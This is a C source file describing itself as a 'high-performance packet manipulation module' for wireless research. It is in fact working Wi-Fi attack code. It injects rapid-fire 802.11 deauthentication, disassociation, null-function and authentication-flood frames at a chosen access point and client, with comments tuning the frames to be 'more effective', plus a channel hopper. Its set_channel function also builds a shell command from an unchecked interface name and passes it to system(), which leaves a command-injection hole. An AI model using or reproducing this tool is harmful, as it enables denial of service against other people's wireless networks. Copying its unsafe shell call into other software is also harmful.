/**
 * libpacket.c - High-performance packet manipulation module
 *
 * This module provides optimized, low-level packet crafting and transmission
 * capabilities for wireless network research, with direct libpcap integration
 * for wire-speed operations.
 */

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <stdint.h>
#include <errno.h>

// Error codes
#define ERR_SUCCESS          0
#define ERR_INVALID_PARAM    1
#define ERR_PCAP_OPEN        2
#define ERR_MEMORY_ALLOC     3
#define ERR_PACKET_SEND      4
#define ERR_CHANNEL_SWITCH   5

// Thread management
typedef struct {
    int running;
    pthread_mutex_t mutex;
    pthread_t thread_id;
} thread_context_t;

// Global context
static thread_context_t global_context = {0};

// Function declarations
int send_deauth(const char* interface, const char* bssid, const char* client, int count, int reason);
int send_disassoc(const char* interface, const char* bssid, const char* client, int count, int reason);
int send_null_func(const char* interface, const char* bssid, const char* client, int count);
int send_auth_flood(const char* interface, const char* bssid, const char* client, int count);
int scan_channels(const char* interface, int* channels, int count);
int set_channel(const char* interface, int channel);
int start_channel_hopper(const char* interface, int* channels, int count, int interval_ms);
int stop_channel_hopper();

// Helper function declarations
static void build_radiotap_header(unsigned char* buffer, int* offset);
static void build_deauth_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes, 
                        const unsigned char* client_bytes, int reason);
static void build_disassoc_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes, 
                          const unsigned char* client_bytes, int reason);
static void build_null_func_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes,
                           const unsigned char* client_bytes);
static void build_auth_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes,
                      const unsigned char* client_bytes);
static void mac_string_to_bytes(const char* mac_str, unsigned char* mac_bytes);
static void* channel_hopper_thread(void* arg);

/**
 * Initialize the library and set up required resources
 * Returns 0 on success, error code otherwise
 */
int initialize() {
    srand((unsigned int)time(NULL));
    global_context.running = 0;
    pthread_mutex_init(&global_context.mutex, NULL);
    return ERR_SUCCESS;
}

/**
 * Clean up resources used by the library
 * Returns 0 on success, error code otherwise
 */
int cleanup() {
    stop_channel_hopper();
    pthread_mutex_destroy(&global_context.mutex);
    return ERR_SUCCESS;
}

/**
 * Send deauthentication packets at wire speed
 *
 * @param interface The wireless interface to use
 * @param bssid The BSSID of the access point
 * @param client The MAC address of the target client
 * @param count Number of packets to send
 * @param reason Reason code for deauthentication
 * @return 0 on success, error code otherwise
 */
int send_deauth(const char* interface, const char* bssid, const char* client, int count, int reason) {
    if (!interface || !bssid || !client || count <= 0) {
        return ERR_INVALID_PARAM;
    }
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 0, errbuf);
    if (!handle) {
        fprintf(stderr, "Error opening interface %s: %s\n", interface, errbuf);
        return ERR_PCAP_OPEN;
    }
    
    // Convert MAC addresses to byte arrays
    unsigned char bssid_bytes[6];
    unsigned char client_bytes[6];
    mac_string_to_bytes(bssid, bssid_bytes);
    mac_string_to_bytes(client, client_bytes);
    
    // Prepare packet buffer with sufficient space
    unsigned char packet[64]; 
    int offset = 0;
    
    // Build packet components
    build_radiotap_header(packet, &offset);
    build_deauth_frame(packet, &offset, bssid_bytes, client_bytes, reason);
    
    // Send packets in rapid succession
    for (int i = 0; i < count; i++) {
        if (pcap_sendpacket(handle, packet, offset) != 0) {
            fprintf(stderr, "Error sending deauth packet: %s\n", pcap_geterr(handle));
            pcap_close(handle);
            return ERR_PACKET_SEND;
        }
        // Minimal delay between packets for stability and throughput
        usleep(300);
    }
    
    pcap_close(handle);
    return ERR_SUCCESS;
}

/**
 * Send disassociation packets at wire speed
 *
 * @param interface The wireless interface to use
 * @param bssid The BSSID of the access point
 * @param client The MAC address of the target client
 * @param count Number of packets to send
 * @param reason Reason code for disassociation
 * @return 0 on success, error code otherwise
 */
int send_disassoc(const char* interface, const char* bssid, const char* client, int count, int reason) {
    if (!interface || !bssid || !client || count <= 0) {
        return ERR_INVALID_PARAM;
    }
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 0, errbuf);
    if (!handle) {
        fprintf(stderr, "Error opening interface %s: %s\n", interface, errbuf);
        return ERR_PCAP_OPEN;
    }
    
    // Convert MAC addresses to byte arrays
    unsigned char bssid_bytes[6];
    unsigned char client_bytes[6];
    mac_string_to_bytes(bssid, bssid_bytes);
    mac_string_to_bytes(client, client_bytes);
    
    // Prepare packet buffer
    unsigned char packet[64];
    int offset = 0;
    
    // Build packet components
    build_radiotap_header(packet, &offset);
    build_disassoc_frame(packet, &offset, bssid_bytes, client_bytes, reason);
    
    // Send packets in rapid succession
    for (int i = 0; i < count; i++) {
        if (pcap_sendpacket(handle, packet, offset) != 0) {
            fprintf(stderr, "Error sending disassoc packet: %s\n", pcap_geterr(handle));
            pcap_close(handle);
            return ERR_PACKET_SEND;
        }
        // Minimal delay between packets for stability and throughput
        usleep(300);
    }
    
    pcap_close(handle);
    return ERR_SUCCESS;
}

/**
 * Send null function packets at wire speed
 *
 * @param interface The wireless interface to use
 * @param bssid The BSSID of the access point
 * @param client The MAC address of the target client
 * @param count Number of packets to send
 * @return 0 on success, error code otherwise
 */
int send_null_func(const char* interface, const char* bssid, const char* client, int count) {
    if (!interface || !bssid || !client || count <= 0) {
        return ERR_INVALID_PARAM;
    }
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 0, errbuf);
    if (!handle) {
        fprintf(stderr, "Error opening interface %s: %s\n", interface, errbuf);
        return ERR_PCAP_OPEN;
    }
    
    // Convert MAC addresses to byte arrays
    unsigned char bssid_bytes[6];
    unsigned char client_bytes[6];
    mac_string_to_bytes(bssid, bssid_bytes);
    mac_string_to_bytes(client, client_bytes);
    
    // Prepare packet buffer
    unsigned char packet[64];
    int offset = 0;
    
    // Build packet components
    build_radiotap_header(packet, &offset);
    build_null_func_frame(packet, &offset, bssid_bytes, client_bytes);
    
    // Send packets in rapid succession
    for (int i = 0; i < count; i++) {
        if (pcap_sendpacket(handle, packet, offset) != 0) {
            fprintf(stderr, "Error sending null function packet: %s\n", pcap_geterr(handle));
            pcap_close(handle);
            return ERR_PACKET_SEND;
        }
        // Minimal delay between packets for stability and throughput
        usleep(300);
    }
    
    pcap_close(handle);
    return ERR_SUCCESS;
}

/**
 * Send authentication flood packets at wire speed
 *
 * @param interface The wireless interface to use
 * @param bssid The BSSID of the access point
 * @param client The MAC address of the target client
 * @param count Number of packets to send
 * @return 0 on success, error code otherwise
 */
int send_auth_flood(const char* interface, const char* bssid, const char* client, int count) {
    if (!interface || !bssid || !client || count <= 0) {
        return ERR_INVALID_PARAM;
    }
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 0, errbuf);
    if (!handle) {
        fprintf(stderr, "Error opening interface %s: %s\n", interface, errbuf);
        return ERR_PCAP_OPEN;
    }
    
    // Convert MAC addresses to byte arrays
    unsigned char bssid_bytes[6];
    unsigned char client_bytes[6];
    mac_string_to_bytes(bssid, bssid_bytes);
    mac_string_to_bytes(client, client_bytes);
    
    // Prepare packet buffer
    unsigned char packet[64];
    int offset = 0;
    
    // Build packet components
    build_radiotap_header(packet, &offset);
    build_auth_frame(packet, &offset, bssid_bytes, client_bytes);
    
    // Send packets in rapid succession
    for (int i = 0; i < count; i++) {
        if (pcap_sendpacket(handle, packet, offset) != 0) {
            fprintf(stderr, "Error sending auth flood packet: %s\n", pcap_geterr(handle));
            pcap_close(handle);
            return ERR_PACKET_SEND;
        }
        // Minimal delay between packets for stability and throughput
        usleep(300);
    }
    
    pcap_close(handle);
    return ERR_SUCCESS;
}

/**
 * Set wireless interface to a specific channel
 *
 * @param interface The wireless interface to use
 * @param channel The channel number to set
 * @return 0 on success, error code otherwise
 */
int set_channel(const char* interface, int channel) {
    if (!interface || channel < 1 || channel > 14) {
        return ERR_INVALID_PARAM;
    }
    
    char command[100];
    snprintf(command, sizeof(command), "iw dev %s set channel %d", interface, channel);
    int ret = system(command);
    
    if (ret != 0) {
        fprintf(stderr, "Error setting channel %d on interface %s\n", channel, interface);
        return ERR_CHANNEL_SWITCH;
    }
    
    return ERR_SUCCESS;
}

/**
 * Scan multiple channels in sequence
 *
 * @param interface The wireless interface to use
 * @param channels Array of channel numbers to scan
 * @param count Number of channels in the array
 * @return 0 on success, error code otherwise
 */
int scan_channels(const char* interface, int* channels, int count) {
    if (!interface || !channels || count <= 0) {
        return ERR_INVALID_PARAM;
    }
    
    for (int i = 0; i < count; i++) {
        int ret = set_channel(interface, channels[i]);
        if (ret != ERR_SUCCESS) {
            return ret;
        }
        usleep(50000); // 50ms delay between channel switches
    }
    
    return ERR_SUCCESS;
}

/**
 * Start a background channel hopper thread
 *
 * @param interface The wireless interface to use
 * @param channels Array of channel numbers to hop between
 * @param count Number of channels in the array
 * @param interval_ms Time to spend on each channel in milliseconds
 * @return 0 on success, error code otherwise
 */
int start_channel_hopper(const char* interface, int* channels, int count, int interval_ms) {
    if (!interface || !channels || count <= 0 || interval_ms <= 0) {
        return ERR_INVALID_PARAM;
    }
    
    // Stop any existing channel hopper
    stop_channel_hopper();
    
    // Allocate and initialize context for the thread
    pthread_mutex_lock(&global_context.mutex);
    global_context.running = 1;
    pthread_mutex_unlock(&global_context.mutex);
    
    // Copy channel data
    int* ch_copy = (int*)malloc(count * sizeof(int));
    if (!ch_copy) {
        return ERR_MEMORY_ALLOC;
    }
    memcpy(ch_copy, channels, count * sizeof(int));
    
    // Create thread argument structure
    struct {
        const char* interface;
        int* channels;
        int count;
        int interval_ms;
    } *thread_arg = malloc(sizeof(*thread_arg));
    
    if (!thread_arg) {
        free(ch_copy);
        return ERR_MEMORY_ALLOC;
    }
    
    thread_arg->interface = strdup(interface);
    thread_arg->channels = ch_copy;
    thread_arg->count = count;
    thread_arg->interval_ms = interval_ms;
    
    // Start the channel hopper thread
    if (pthread_create(&global_context.thread_id, NULL, channel_hopper_thread, thread_arg) != 0) {
        free(ch_copy);
        free((void*)thread_arg->interface);
        free(thread_arg);
        return ERR_CHANNEL_SWITCH;
    }
    
    return ERR_SUCCESS;
}

/**
 * Stop the background channel hopper thread
 *
 * @return 0 on success, error code otherwise
 */
int stop_channel_hopper() {
    pthread_mutex_lock(&global_context.mutex);
    if (global_context.running) {
        global_context.running = 0;
        pthread_mutex_unlock(&global_context.mutex);
        pthread_join(global_context.thread_id, NULL);
        return ERR_SUCCESS;
    }
    pthread_mutex_unlock(&global_context.mutex);
    return ERR_SUCCESS;
}

/**
 * Channel hopper thread function
 */
static void* channel_hopper_thread(void* arg) {
    struct {
        const char* interface;
        int* channels;
        int count;
        int interval_ms;
    } *thread_arg = (void*)arg;
    
    const char* interface = thread_arg->interface;
    int* channels = thread_arg->channels;
    int count = thread_arg->count;
    int interval_ms = thread_arg->interval_ms;
    
    int i = 0;
    int running = 1;
    
    while (running) {
        // Set the channel
        set_channel(interface, channels[i]);
        
        // Move to next channel
        i = (i + 1) % count;
        
        // Sleep for the interval
        usleep(interval_ms * 1000);
        
        // Check if we should continue
        pthread_mutex_lock(&global_context.mutex);
        running = global_context.running;
        pthread_mutex_unlock(&global_context.mutex);
    }
    
    // Clean up
    free(channels);
    free((void*)interface);
    free(thread_arg);
    
    return NULL;
}

/**
 * Build optimized radiotap header for packet injection
 *
 * @param buffer Packet buffer to write to
 * @param offset Current offset in buffer, updated after writing
 */
static void build_radiotap_header(unsigned char* buffer, int* offset) {
    // Radiotap header optimized for 802.11 injection
    unsigned char header[] = {
        0x00, 0x00,             // Version 0
        0x0c, 0x00,             // Header length 12
        0x04, 0x80, 0x00, 0x00, // Present flags (rate + tx flags)
        0x02,                   // Rate (1 Mbps)
        0x00,                   // Padding
        0x18, 0x00              // TX flags (use RTS/CTS + no ACK)
    };
    
    memcpy(buffer + *offset, header, sizeof(header));
    *offset += sizeof(header);
}

/**
 * Build deauthentication frame with specified parameters
 *
 * @param buffer Packet buffer to write to
 * @param offset Current offset in buffer, updated after writing
 * @param bssid_bytes BSSID in byte array format
 * @param client_bytes Client MAC in byte array format
 * @param reason Reason code for deauthentication
 */
static void build_deauth_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes, 
                        const unsigned char* client_bytes, int reason) {
    // 802.11 header for deauthentication frame
    buffer[*offset + 0] = 0xC0;               // Frame Control - Type: Management, Subtype: Deauth
    buffer[*offset + 1] = 0x00;               // Frame Control - No flags
    buffer[*offset + 2] = 0x00;               // Duration ID
    buffer[*offset + 3] = 0x00;               // Duration ID
    
    // Address fields
    memcpy(buffer + *offset + 4, client_bytes, 6);   // Destination (client)
    memcpy(buffer + *offset + 10, bssid_bytes, 6);   // Source (BSSID)
    memcpy(buffer + *offset + 16, bssid_bytes, 6);   // BSSID
    
    // Sequence control - randomize for more effective deauth
    unsigned short seq = (unsigned short)(rand() & 0x0FFF) << 4;
    buffer[*offset + 22] = seq & 0xFF;
    buffer[*offset + 23] = (seq >> 8) & 0xFF;
    
    // Reason code
    buffer[*offset + 24] = reason & 0xFF;         // Lower byte
    buffer[*offset + 25] = (reason >> 8) & 0xFF;  // Upper byte
    
    *offset += 26; // Update total frame size
}

/**
 * Build disassociation frame with specified parameters
 *
 * @param buffer Packet buffer to write to
 * @param offset Current offset in buffer, updated after writing
 * @param bssid_bytes BSSID in byte array format
 * @param client_bytes Client MAC in byte array format
 * @param reason Reason code for disassociation
 */
static void build_disassoc_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes, 
                          const unsigned char* client_bytes, int reason) {
    // 802.11 header for disassociation frame
    buffer[*offset + 0] = 0xA0;               // Frame Control - Type: Management, Subtype: Disassoc
    buffer[*offset + 1] = 0x00;               // Frame Control - No flags
    buffer[*offset + 2] = 0x00;               // Duration ID
    buffer[*offset + 3] = 0x00;               // Duration ID
    
    // Address fields
    memcpy(buffer + *offset + 4, client_bytes, 6);   // Destination (client)
    memcpy(buffer + *offset + 10, bssid_bytes, 6);   // Source (BSSID)
    memcpy(buffer + *offset + 16, bssid_bytes, 6);   // BSSID
    
    // Sequence control - randomize for more effective disassoc
    unsigned short seq = (unsigned short)(rand() & 0x0FFF) << 4;
    buffer[*offset + 22] = seq & 0xFF;
    buffer[*offset + 23] = (seq >> 8) & 0xFF;
    
    // Reason code
    buffer[*offset + 24] = reason & 0xFF;         // Lower byte
    buffer[*offset + 25] = (reason >> 8) & 0xFF;  // Upper byte
    
    *offset += 26; // Update total frame size
}

/**
 * Build null function frame with specified parameters
 *
 * @param buffer Packet buffer to write to
 * @param offset Current offset in buffer, updated after writing
 * @param bssid_bytes BSSID in byte array format
 * @param client_bytes Client MAC in byte array format
 */
static void build_null_func_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes, 
                           const unsigned char* client_bytes) {
    // 802.11 header for null function frame
    buffer[*offset + 0] = 0x48;               // Frame Control - Type: Data, Subtype: Null function
    buffer[*offset + 1] = 0x01;               // Frame Control - ToDS flag
    buffer[*offset + 2] = 0x00;               // Duration ID
    buffer[*offset + 3] = 0x00;               // Duration ID
    
    // Address fields
    memcpy(buffer + *offset + 4, bssid_bytes, 6);    // Destination (BSSID)
    memcpy(buffer + *offset + 10, client_bytes, 6);  // Source (Client)
    memcpy(buffer + *offset + 16, bssid_bytes, 6);   // BSSID
    
    // Sequence control - randomize for more effective frame
    unsigned short seq = (unsigned short)(rand() & 0x0FFF) << 4;
    buffer[*offset + 22] = seq & 0xFF;
    buffer[*offset + 23] = (seq >> 8) & 0xFF;
    
    *offset += 24; // Update total frame size
}

/**
 * Build authentication frame with specified parameters
 *
 * @param buffer Packet buffer to write to
 * @param offset Current offset in buffer, updated after writing
 * @param bssid_bytes BSSID in byte array format
 * @param client_bytes Client MAC in byte array format
 */
static void build_auth_frame(unsigned char* buffer, int* offset, const unsigned char* bssid_bytes, 
                      const unsigned char* client_bytes) {
    // 802.11 header for authentication frame
    buffer[*offset + 0] = 0xB0;               // Frame Control - Type: Management, Subtype: Auth
    buffer[*offset + 1] = 0x00;               // Frame Control - No flags
    buffer[*offset + 2] = 0x00;               // Duration ID
    buffer[*offset + 3] = 0x00;               // Duration ID
    
    // Address fields
    memcpy(buffer + *offset + 4, bssid_bytes, 6);    // Destination (BSSID)
    memcpy(buffer + *offset + 10, client_bytes, 6);  // Source (Client)
    memcpy(buffer + *offset + 16, bssid_bytes, 6);   // BSSID
    
    // Sequence control - randomize for more effective frame
    unsigned short seq = (unsigned short)(rand() & 0x0FFF) << 4;
    buffer[*offset + 22] = seq & 0xFF;
    buffer[*offset + 23] = (seq >> 8) & 0xFF;
    
    // Authentication algorithm (open)
    buffer[*offset + 24] = 0x00;
    buffer[*offset + 25] = 0x00;
    
    // Authentication sequence
    buffer[*offset + 26] = 0x01;
    buffer[*offset + 27] = 0x00;
    
    // Status code (success)
    buffer[*offset + 28] = 0x00;
    buffer[*offset + 29] = 0x00;
    
    *offset += 30; // Update total frame size
}

/**
 * Convert MAC address string to byte array
 *
 * @param mac_str MAC address string in xx:xx:xx:xx:xx:xx format
 * @param mac_bytes Output byte array (must be at least 6 bytes)
 */
static void mac_string_to_bytes(const char* mac_str, unsigned char* mac_bytes) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], 
           &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
}